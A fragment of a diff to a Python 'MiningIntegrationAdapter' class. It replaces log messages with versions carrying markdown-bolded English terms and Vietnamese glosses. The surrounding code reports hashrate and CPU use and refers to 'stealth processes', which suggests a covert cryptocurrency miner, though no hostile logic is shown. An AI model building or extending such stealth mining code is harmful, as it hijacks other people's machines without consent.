                             if hasattr(self.calculation_chain, 'restart_workers'):
-                                self.logger.info(f"[PROCESS-LOG] Attempting worker restart...")
+                                self.logger.info(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Attempting worker restart...")
                                 self.calculation_chain.restart_workers()
                                 
                     except Exception as health_error:
-                        self.logger.error(f"[PROCESS-LOG] Error checking worker health: {health_error}")
+                        self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] **[error]** (lỗi) checking worker health: {health_error}")
                 
                 # Adaptive pause dựa trên performance
                 if all_results:
@@ -1086,14 +1086,14 @@ class MiningIntegrationAdapter:
                 else:
                     pause_time = min(2.0, 0.5 + (consecutive_empty_results * 0.2))  # Increasing pause for failures
                     
-                self.logger.debug(f"[PROCESS-LOG] Waiting {pause_time:.1f}s before next batch")
+                self.logger.debug(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Waiting {pause_time:.1f}s before next batch")
                 self.shutdown_event.wait(pause_time)
                 
             except Exception as e:
-                self.logger.error(f"[PROCESS-LOG] Workload management error in batch {batch_counter}: {e}")
+                self.logger.error(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Workload management **[error]** (lỗi) in batch {batch_counter}: {e}")
                 self.shutdown_event.wait(2.0)
         
-        self.logger.info(f"[PROCESS-LOG] Workload management loop terminated - Total batches: {batch_counter}")
+        self.logger.info(f"[**[process]** (tiến trình)-**[log]** (nhật ký)] Workload management loop terminated - Total batches: {batch_counter}")
     
     def cleanup(self):
         """Clean up all resources including stealth processes"""
@@ -1115,7 +1115,7 @@ class MiningIntegrationAdapter:
                     self.communication_bridge = None
                     self.logger.info("✅ [IPC] Communication bridge cleanup completed")
                 except Exception as bridge_cleanup_error:
-                    self.logger.error(f"❌ [IPC] Error cleaning up communication bridge: {bridge_cleanup_error}")
+                    self.logger.error(f"❌ [IPC] **[error]** (lỗi) cleaning up communication bridge: {bridge_cleanup_error}")
             
             # Shutdown components
             if self.calculation_chain:
@@ -1136,7 +1136,7 @@ class MiningIntegrationAdapter:
             self.logger.info("✅ MiningIntegrationAdapter cleanup completed")
             
         except Exception as e:
-            self.logger.error(f"Error during cleanup: {e}")
+            self.logger.error(f"**[error]** (lỗi) during cleanup: {e}")
     
     def get_integration_status(self) -> Dict[str, Any]:
         """Get current integration status including stealth capabilities"""
@@ -1231,7 +1231,7 @@ if __name__ == "__main__":
                     metrics = adapter.get_performance_metrics()
                     if metrics:
                         logger.info(f"📊 Performance Test Results:")
-                        logger.info(f"   Total CPU: {metrics.total_cpu_utilization:.1f}%")
+                        logger.info(f"   Total **[CPU]** (bộ xử lý trung tâm): {metrics.total_cpu_utilization:.1f}%")
                         logger.info(f"   Hashrate: {metrics.hashrate:.2f} H/s")
                         logger.info(f"   Tasks: {metrics.tasks_completed}")
                         logger.info(f"   Workers: {metrics.active_workers}")
